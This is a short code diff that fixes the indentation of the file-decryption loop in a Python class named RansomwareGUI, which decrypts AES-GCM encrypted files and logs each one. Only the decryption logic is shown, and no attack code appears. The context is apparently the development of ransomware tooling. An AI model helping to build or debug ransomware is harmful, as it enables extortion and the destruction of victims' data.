@@ -472,10 +472,10 @@ class RansomwareGUI:
                     for file in files:
                             if file.endswith(ENCRYPTED_EXTENSION):
                                 file_path = os.path.join(root, file)
-                            if decrypt_file_aes_gcm(file_path, key):
-                                decrypted_files += 1
-                                self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
-                                time.sleep(0.05)
+                                if decrypt_file_aes_gcm(file_path, key):
+                                    decrypted_files += 1
+                                    self.master.after(0, self.log_message, f"DECRYPTED: {file_path}", "green")
+                                    time.sleep(0.05)
                 
                 # Cleanup moved to finish_decryption to prevent data loss on crash
                 
